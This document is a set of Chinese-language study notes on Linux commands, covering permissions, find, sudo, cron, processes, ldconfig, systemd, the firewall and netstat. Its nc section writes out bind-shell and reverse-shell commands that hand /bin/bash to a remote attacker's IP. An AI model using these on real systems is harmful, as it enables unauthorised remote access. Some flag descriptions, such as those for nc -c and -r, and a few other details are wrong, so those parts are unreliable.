### Linux

当忘记一条命令如何使用时，`man [cmd]`，打开帮助手册查看详细用法

#### 权限管理

ls -l ：查看目录下文件的权限

ex：-rwxr-xr-x 1 root root 17456 Mar 16 01:17 a.out

文件类型 所有者权限 拥有者同组权限 其他用户权限 此目录下一级目录的个数（.包括在内）所有者 所有者的组 文件大小 月 日 时:分  文件名

第一个字母表明文件类型：

- d：文件夹
- -：普通文件
- l：软链接（类似Windows的快捷方式）
- b：块设备文件（例如硬盘、光驱等）
- p：管道文件
- c：字符设备文件（例如屏幕等串口设备）
- s：套接口文件

每三个代表不同级别的权限

- u：owner，所有者
- g：group，拥有者同组
- o：other，其他用户
- a：所有用户

权限：

- r：读  ，4
- w：写，2
- x：执行，1

权限也可用八进制来表示

更改权限：

chmod 用户标识符(u,g,o,a) +|- 权限字符 文件名

+代表赋予，-代表收回

```bash
特殊权限位设定
1000 
```

#### 查找文件

locate：locate命令主要是用来查找文件的，但它的速度比find命令快很多。因为它不是按路径进行搜索的，而是去搜索一个数据库，即/var/lib/mlocate/mlocate.db。这个数据库中含有本地所有文件信息，Linux系统自动创建这个数据库，并且每天自动更新一次。

但注意，我们在使用locate命令搜索文件时可能搜索到已删除或者搜索不到新创建或上传的文件，这是因为数据库文件没有被更新。所以每次在执行locate命令之前，都需要先执行updatedb命令更新数据库文件，即使是在脚本中也需要先执行updatedb命令更新数据库文件再执行locate命令查找文件。

locate命令会通过数据库进行查找文件，速度非常快；而find命令则是直接在硬盘上查找文件，查找速度非常慢。

##### find

1. 查找指定文件， `find / -name 文件名`，也可以用正则表达式匹配，`find . -name "正则表达式"`
2. 查找指定类型的文件，`find / -type 文件类型`
3. 查找指定用户的文件，`find / -user 用户名`
4. 查找指定权限的用户：`find -perm 权限表达式`
   1. -perm mode：严格匹配
   2. -perm -mode：查找所有满足权限要求的文件，非严格匹配，而是不论其他未要求的权限位是如何设置，都会被检索出来
   3. -perm /mode：查找满足任何一个权限位的文件。如果mode中某个权限位没有限定，则认为该权限位满足条件

#### sudo

sudo是普通用户提权命令，仅需输入本用户密码

* sudo -l：列出可用的命令
* sudo -i: 以root身份登录
* sudo -s: 一般等同于sudo bash,进入root环境，不改变工作目录
* sudo -u: 不加默认以root权限执行，-u username 表示以所属者的身份执行

sudo配置文件在 `/etc/sudoers`

#### su

su是切换用户的命令，需要输入对应用户密码；

* su -l username：切换到其他用户，需要输入切换到到的用户的密码，省略username切换到其他用户，需要输入该用户的密码，等同于root身份登录

#### suid与guid与t权限

suid：这是一种特殊权限,设置了suid的脚本文件,在其他用户执行该脚本时,此用户的权限是该脚本文件属主的权限。

guid：设置了guid的脚本文件，执行此脚本文件的用户将具有该文件所属用户组中用户的权限

t：程序的t属性表示粘着位，即告诉系统在程序完成后在内存中保存一份运行程序的备份，如该程序常用，可为系统 节省点时间，不用每次从磁盘加载到内存，只有该目录的所有者及root才能删除该目录，如/tmp目录就是drwxrwxrwt

设置suid：`chmod 4xxx filename`，在权限位前加4，或者 `u+s`

设置guid：`chmod 2xxx filename`，在权限位前加2，或者 `g+s`

同时设置suid与guid：`chmod 6xxx filename`，在权限位前加6，或者 `a+s`

设置t权限：`chmod 1xxx filename`，在其van纤维前加1，或者 `t+s`

#### exec

exec 命令，以命令代替shell，执行命令后退出

#### 环境变量

export：显示所有环境变量

echo $PATH：单独查看PATH环境变量

export PATH=$PATH:/所添加的变量内容：修改PATH环境变量，PATH变量是以:分隔开的，修改时令new_PATH=old_PATH:new_value

export命令只针对当前shell有效，若要永久生效

1. 修改.bashrc文件，普通用户即可修改；对当前登录用户有效
2. 修改profile文件，需要root权值；对所有用户都有效

#### source

在当前shell中执行脚本，与./shell，sh ./shell，bash ./shell不同在于，source是在当前shell执行，其他命令会是在子shell运行的，结果并没有反映到父shell中，如果执行设置环境变量的的脚本，要是使用source命令，直接执行会导致设置了子shell的环境变量，而子shell执行完就关闭了，设置无效

#### 文件描述符

* 0 —— stdin（标准输入）
* 1 —— stdout （标准输出）
* 2 —— stderr （标准错误）

可以利用重定向操作改变输入的来源，将标准输出重定向到文件，丢弃错误信息，例如：2>/dev/null

#### 压缩与解压缩

* **tar**

  ```
  # 压缩文件 file1 和目录 dir2 到 test.tar.gz
  tar -zcvf test.tar.gz file1 dir2

  # 解压 test.tar.gz（将 c 换成 x 即可）
  tar -zxvf test.tar.gz

  # 解压 test.tar（将 c 换成 x 即可）
  tar -xf test.tar

  # 列出压缩文件的内容
  tar -ztvf test.tar.gz 

  -z : 使用 gzip 来压缩和解压文件
  -v : --verbose 详细的列出处理的文件
  -f : --file=ARCHIVE 使用档案文件或设备，这个选项通常是必选的
  -c : --create 创建一个新的归档（压缩包）
  -x : 从压缩包中解出文件
  ```
* **rar**

  ```
  # 压缩文件
  rar a -r test.rar file

  # 解压文件
  unrar x test.rar

  a : 添加到压缩文件
  -r : 递归处理
  x : 以绝对路径解压文件
  ```
* **zip**

  ```
  # 压缩文件
  zip -r test.zip file
  # 解压文件
  unzip test.zip
  -r : 递归处理
  ```

#### &&,&,||,|

* &  表示任务在后台执行，如要在后台运行redis-server,则有  redis-server &
* && 表示前一条命令执行成功时，才执行后一条命令 ，如 echo '1‘ && echo '2'
* | 表示管道，上一条命令的输出，作为下一条命令参数，如 echo 'yes' | wc -l
* || 表示上一条命令执行失败后，才执行下一条命令，如 cat nofile || echo "fail"

#### 定时任务

通过设置环境变量改变指定的编辑器

```
export EDITOR=vim
```

* 列出：`crontab -l`
* 编辑：`crontab -e`
* 删除：`crontab -r`

此外通过 `-u [username]`指定用户（不指定默认当前用户）

crontab是用户级别的定时任务，储存的文件在 `/var/spool/cron/crontabs/[username]`

可以通过系统级别的定时任务，编辑 `/etc/crontab` 文件来执行

#### 查看端口和进程信息

* ps命令，参数如下：

  ```
  无参数：仅列出当前终端会话启动的进程的简单信息
  -A: 列出所有的进程
  -x：显示所有包含其他使用者的进程
  -aux：显示较详细的信息
  -ef：显示较详细的信息
  参数过多，需要详细用法时man ps
  ```
* 各字段表示：

  ```
  UID：拥有者
  PID：进程号
  PPID：父进程的进程号
  TTY：终端号
  TIME：执行的时间
  STIME：具体时间
  STAT：该进程的状态，如下
  	D: 无法中断的休眠状态 (通常 IO 的进程)
  	R: 正在执行中
  	S: 静止状态
  	T: 暂停执行
  	Z: 不存在但暂时无法消除
  	W: 没有足够的记忆体分页可分配
  	<: 高优先序的进程
  	N: 低优先序的进程
  	L: 有记忆体分页分配并锁在记忆体内 (实时系统或捱A I/O)
  COMMEND：由什么命令启动的进程
  %CPU：占用CPU
  %MEM：占用内存
  VSZ（Virtual Memory Size）：虚拟内存大小，操作系统分配给进程的虚拟内存，但并不意味这些内存已被全部使用，Linux利用了请求分页，它只在应用程序尝试使用页面时才将页面加载到物理内存中，他不是给进程使用内存多少的精确量度，而是一个进程可以使用最大内存量的标准
  RSS（Resident Set Size）：驻留集大小，进程加载的所有页面的内存大小，但还包括了共享的动态链接库，因此也不是进程实际占用的内存大小
  ```

#### kill命令

kill命令向操作系统内核发送一个信号，使用 `kill -l`查看所有信号，常用如下：

| 信号编号 | 信号名 | 含义                                                                                 |
| -------- | ------ | ------------------------------------------------------------------------------------ |
| 0        | EXIT   | 程序退出时收到该信息                                                                 |
| 1        | HUP    | 挂掉电话线或终端连接的挂起信号，这个信号也会造成某些进程在没有终止的情况下重新初始化 |
| 2        | INT    | 表示结束进程，但并不是强制性的，常用的 "Ctrl+C" 组合键发出就是一个 kill -2 的信号    |
| 3        | QUIT   | 退出                                                                                 |
| 9        | KILL   | 杀死进程，即强制结束进程                                                             |
| 11       | SEGV   | 段错误                                                                               |
| 15       | TERM   | 正常结束进程，是 kill 命令的默认信号                                                 |

用法：`kill [信号名] PID`

#### ldconfig

* 链接器名称：lib[库名].so
* 完全限定的soname：lib[库名].so.[主版本号]
* 真实名称：lib[库名].[主版本号].[次版本号].[发布版本号]

共享库的链接名称是一个指向完全限定的soname的符号链接，而完全限定的soname是一个指向真实名称的符号链接，`ldconfig` 命令用来创建符号链接

当运行一个elf文件时，默认情况下装载器是第一个被运行的，装载器本身也是一个共享库文件 `/lib/ld-linux.so.*`，这个装载器会找到并且装载所有我们程序所依赖的共享库文件。装载器在默认搜索目录（`/usr/lib`和 `/lib`）以及动态库配置文件 `/etc/ld.so.conf` 内所列的目录下搜索共享库，搜索这些目录下的共享库耗时很长。

ldconfig会建立所需要的符号链接，然后在 `/etc/ld.so.cache` 文件中创建一个所有可执行文件需要的所有共享库的高速缓存，从缓存中读取信息可大大减少装载器花费的时间。

`ldconfig`通常在系统启动时运行，而当用户安装或删除了一个新的动态链接库时，就需要手动运行这个命令

```
1、-v或–verbose:用此选项时,ldconfig将显示正在扫描的目录及搜索到的动态链接库,还有它所创建的连接的名字.
2、-n :用此选项时,ldconfig仅扫描命令行指定的目录,不扫描默认目录(/lib,/usr/lib),也不扫描配置文件/etc/ld.so.conf所列的目录.
3、-N :此选项指示ldconfig不重建缓存文件(/etc/ld.so.cache).若未用-X选项,ldconfig照常更新文件的连接.
4、-X : 此选项指示ldconfig不更新文件的连接.若未用-N选项,则缓存文件正常更新.
5、-f CONF : 此选项指定动态链接库的配置文件为CONF,系统默认为/etc/ld.so.conf.
6、-C CACHE :此选项指定生成的缓存文件为CACHE,系统默认的是/etc/ld.so.cache,此文件存放已排好序的可共享的动态链接库的列表.
7、-r ROOT :此选项改变应用程序的根目录为ROOT(是调用chroot函数实现的).选择此项时,系统默认的配置文件/etc/ld.so.conf,实际对应的为ROOT/etc/ld.so.conf.如用-r/usr/zzz时,打开配置文件/etc/ld.so.conf时,实际打开的是/usr/zzz/etc/ld.so.conf文件.用此选项,可以大大增加动态链接库管理的灵活性.
8、-l :通常情况下,ldconfig搜索动态链接库时将自动建立动态链接库的连接.选择此项时,将进入专家模式,需要手工设置连接.一般用户不用此项.
9、-p或–print-cache :此选项指示ldconfig打印出当前缓存文件所保存的所有共享库的名字.
10、-c FORMAT 或–format=FORMAT :此选项用于指定缓存文件所使用的格式,共有三种:ld(老格式),new(新格式)和compat(兼容格式,此为默认格式).
11、-V : 此选项打印出ldconfig的版本信息,而后退出.
12、- 或 --help 或–usage : 这三个选项作用相同,都是让ldconfig打印出其帮助信息,而后退出.
```

#### 常见隐藏文件功能

1. `.bash_history`：记录用户最近使用的500条命令
2. `.bash_logout`：用户登出时执行的命令
3. `.bash_profile`：用于配置环境变量和启动程序，但只针对单个用户有效

   ```
   /etc/profile,用于设置系统级的环境变量和启动程序，在这个文件下配置会对所有用户生效
   ```
4. `.bashrc`：`bash`在每次启动时都会加载 `.bashrc` 文件的内容

##### 用户登陆时

非交互式登录shell，如反弹shell，执行home目录下的 `.bashrc`文件

用户正常登录shell时：

1. 执行 `/etc/profile`，然后根据其内容读取额外的设定的文档，如 `<b>/etc/profile.d</b>`和 `<b>/etc/inputrc</b>`
2. 根据不同使用者帐号，于其家目录内读取 `.bash_profile`
3. 读取失败则会读取 `<b>~/.bash_login</b>`；
4. 再次失败则读取 `<b>~/.profile</b>`（这三个文档设定基本上无差别，仅读取上有优先关系）；
5. 最后，根据用户帐号读取 `<b>~/.bashrc</b>`

#### lsof

`List Open File` 获取被进程打开的文件信息

列：

```
COMMAND		进程名
PID		进程ID
USER 		所属用户

FD是文件描述符，类型如下：
cwd	当前目录
txt	txt文件
rtd	root目录
mem	内存映射文件
 
TYPE，文件类型，
DIR	目录
REG	普通文件
CHR	字符
a_inode	Inode文件
FIFO	管道或者socket文件
netlink	网络
unknown	未知

DEVICE		设备ID

SIZE/OFF	进程大小

NODE		文件的Inode号

NAME		表示路径或者链接
```

参数：

```
-u [username1 username2 ···]：列出指定用户打开的文件
-i[:port] [4/6] [TCP/UDP]：列出所有打开的网络文件,指定端口号,指定协议
-p [PID]：列出指定进程打开的文件
```

#### stat

stat命令用于显示文件的状态信息。stat命令的输出信息比[ls](http://man.linuxde.net/ls "ls命令")命令的输出信息要更详细

#### 查看磁盘空间

1. `ls -liah`:仅可查看文件大小，无法查看文件夹大小
2. `du -sh ./*`:disk usage，查看文件或目录所占磁盘空间，s表只显示指定目录和文件而不显示子目录大小，h表示提高可读性以k，m，g作为单位显示

#### 自启动项

在 `/etc`下有一系列rc文件夹它们作用分别是

* `rc0.d`: 这个目录包含了系统关机时要执行的脚本
* `rc1.d`: 这个目录包含了系统进入单用户模式时要执行的脚本
* `rc2.d`, `rc3.d`, `rc4.d`, `rc5.d`: 这些目录包含了系统进入多用户模式时要执行的脚本。通常，多用户模式是系统的正常运行模式
* `rc6.d`: 这个目录包含了系统重启时要执行的脚本
* **`rcS.d`** ：包含在系统启动时运行的启动脚本，这些脚本在系统启动时会按照一定的顺序被执行，通常用于进行一些初始化和配置工作，例如挂载文件系统、设置网络、启动基本的系统服务等

以上这些文件夹中的内容都是链接，这些链接指向 `/etc/init.d`下的脚本

rc.local是/etc下的文件，它会在 Linux 系统各项服务都启动完毕之后再被运行，如果想要添加开机运行的脚本，可以在其中添加

#### 系统服务

在 `/etc/systemd/system`目录下，创建一个以 `.service`结尾的文件，内容为

```
[Unit]
Description=[Description]
 
[Service]
ExecStart=[执行的命令]
 
[Install]
WantedBy=default.target
# 指定了该单元（通常是一个服务单元）是由系统默认的启动目标所需要的。换句话说，当系统进入默认的启动目标时，该服务单元将会被启动
```

* 查看特定服务状态：`systemctl status [service_name]`
  不指定参数将显示当前系统中所有单元（units）的状态，包括服务、挂载、套接字等
* 启动服务：`systemctl start [service_name]`
* 停止服务：`systemctl stop [service_name]`
* 重启服务：`systemctl restart [service_name]`
* 启用服务（在系统启动时自动启动）：`systemctl enable [service_name]`
* 禁用服务（在系统启动时不自动启动）：`systemctl disable [service_name]`
* 查看服务是否已启用：`systemctl is-enabled [service_name]`
* 查看服务的详细信息：`systemctl show [service_name]`
* 列出所有已启动的服务：`systemctl list-units --type=service --state=running`
* 查看开机启动服务： `systemctl list-unit-files --type=service | grep enabled`

#### 防火墙

Ubuntu自带的防火墙为ufw

* 查看防火墙状态：`sudo ufw status verbose`
* 开启防火墙：`sudo ufw enable`
* 关闭防火墙：`sudo ufw disable`
* 允许外部访问端口：`ufw allow [port/service]`
* 禁止外部访问端口：`ufw deny [port/service]`

#### nc

##### 正向连接

靶机执行：nc -lvp [port] -e /bin/bash

攻击机监听：nc [ip] [port]

##### 反弹shell

攻击机监听：nc -lvnp [port]

靶机反弹shell：nc [ip] [port]-c /bin/bash

##### 参数

* `-l`：监听模式。用于在本地创建一个监听端口，等待连接。
* `-v`：详细模式，显示更多调试信息。
* `-n`：不进行 DNS 解析。
* `-p <port>`：指定端口号。
* `-e <program>`：将输出从网络传输到指定的程序。
* `-c <count>`：设置发送的数据包数量。
* `-i <interval>`：设置数据包的发送间隔时间（单位：秒）。
* `-q <secs>`：设置退出时间。
* `-r`：随机发送数据。
* `-s <size>`：指定数据包大小
* `-w <timeout>`：设置超时时间（单位：秒）。
* `-z`：仅扫描端口，不进行数据传输。
* `-u`：使用 UDP 协议。

一些特定版本的nc放弃了-e和-c等危险功能

#### 查看开放端口

##### netstat

* -a：显示所有连线中的Socket
* -t：显示TCP 传输协议的连线状况
* -u：显示UDP传输协议的连线状况
* -n：直接使用IP地址，而不通过域名服务器
* -l：显示监控中的服务器的Socket
* -p：显示正在使用Socket的程序识别码和程序名称

```
1.查找请求数前20个IP（常用于查找攻来源）：
netstat -anlp|grep 80|grep tcp|awk '{print $5}'|awk -F: '{print $1}'|sort|uniq -c|sort -nr|head -n20
 
netstat -ant |awk '/:80/{split($5,ip,”:”);++A[ip[1]]}END{for(i in A) print A[i],i}' |sort -rn|head -n20
 
2.用tcpdump嗅探80端口的访问看看谁最高
tcpdump -i eth0 -tnn dst port 80 -c 1000 | awk -F”.” '{print $1″.”$2″.”$3″.”$4}' | sort | uniq -c | sort -nr |head -20
 
3.查找较多time_wait连接
netstat -n|grep TIME_WAIT|awk '{print $5}'|sort|uniq -c|sort -rn|head -n20
 
4.找查较多的SYN连接
netstat -an | grep SYN | awk '{print $5}' | awk -F: '{print $1}' | sort | uniq -c | sort -nr | more
 
5.根据端口列进程
netstat -ntlp | grep 80 | awk '{print $7}' | cut -d/ -f1
```
